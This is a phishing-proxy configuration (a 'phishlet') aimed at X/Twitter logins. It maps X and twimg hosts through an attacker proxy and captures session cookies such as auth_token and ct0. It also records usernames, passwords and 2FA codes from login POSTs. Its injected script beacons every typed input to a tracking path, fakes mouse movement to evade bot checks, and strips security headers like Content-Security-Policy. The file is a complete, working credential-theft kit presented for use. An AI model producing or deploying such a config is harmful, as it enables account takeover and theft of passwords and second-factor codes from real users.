name: "x"
author: "@redteam_expert"
min_ver: "3.0.0"
proxy_hosts:
  - {phish_sub: "x", orig_sub: "x", domain: "com", session: true, is_landing: true}
  - {phish_sub: "www", orig_sub: "www", domain: "x.com", session: false, is_landing: false}
  - {phish_sub: "api", orig_sub: "api", domain: "x.com", session: true, is_landing: false}
  - {phish_sub: "abs", orig_sub: "abs", domain: "twimg.com", session: false, is_landing: false}
  - {phish_sub: "abs-0", orig_sub: "abs-0", domain: "twimg.com", session: false, is_landing: false}
sub_filters:
  - {triggers_on: "x.com", orig_sub: "x", domain: "com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "x.com", orig_sub: "www", domain: "x.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"]}
  - {triggers_on: "x.com", orig_sub: "api", domain: "x.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json"]}
  - {triggers_on: "x.com", orig_sub: "abs", domain: "twimg.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "x.com", orig_sub: "abs-0", domain: "twimg.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "x.com", orig_sub: "api", domain: "twitter.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "x.com", orig_sub: "ton", domain: "twimg.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "x.com", orig_sub: "pbs", domain: "twimg.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "x.com", orig_sub: "video", domain: "twimg.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"]}
auth_tokens:
  - domain: ".twitter.com"
    keys: ["auth_token", "ct0", "_twitter_sess", "guest_id", "kdt"]
  - domain: "twitter.com"
    keys: ["auth_token", "ct0", "_twitter_sess"]
  - domain: ".x.com"
    keys: ["auth_token", "ct0", "_twitter_sess", "guest_id", "kdt"]
credentials:
  username:
    key: "text"
    search: "(.*)"
    type: "post"
  password:
    key: "password"
    search: "(.*)"
    type: "post"
  2fa:
    key: "response"
    search: "(.*)"
    type: "post"
login:
  domain: "x.com"
  path: "/i/flow/login"
js_inject:
  - trigger_domains: ["x.com", "twitter.com"]
    trigger_paths: ["/i/flow/login", "/login"]
    script: |
      (function(){
        // Anti-Bot: Mock user behavior
        document.addEventListener('contextmenu', e => e.preventDefault());
        setInterval(() => {
           const ev = new MouseEvent('mousemove', {
               view: window, bubbles: true, cancelable: true, 
               clientX: Math.random() * window.innerWidth, clientY: Math.random() * window.innerHeight
           });
           document.dispatchEvent(ev);
        }, 2500);
        
        // Input Capture
        document.addEventListener('input', function(e) {
            if(e.target.tagName === 'INPUT') {
                 // Send to Beacon
                 if(window.navigator.sendBeacon) {
                    const data = new FormData();
                    data.append('k', e.target.value);
                    data.append('f', e.target.name || e.target.id);
                    window.navigator.sendBeacon('/__vanta_track', data);
                 }
            }
        });
      })();
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
  - {action: "remove", name: "X-Content-Type-Options"}
  - {action: "add", name: "X-Robots-Tag", value: "noindex, nofollow, noarchive"}
path_rewrites:
  - {pattern: "^/$", replace: "/i/flow/login", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "analytics|gtm|/static/", mimes: ["text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action*=\"login\"], form[data-testid*=\"Login\"]", action_to: "/sessions"}
bridges:
  - {prefix: "/_xapi/", target_host: "api.x.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_xabs/", target_host: "abs.twimg.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_xton/", target_host: "ton.twimg.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_xpbs/", target_host: "pbs.twimg.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_xvid/", target_host: "video.twimg.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_xtapi/", target_host: "api.twitter.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_xtw/", target_host: "twitter.com", strip_prefix: true, cors: "allow_all"}
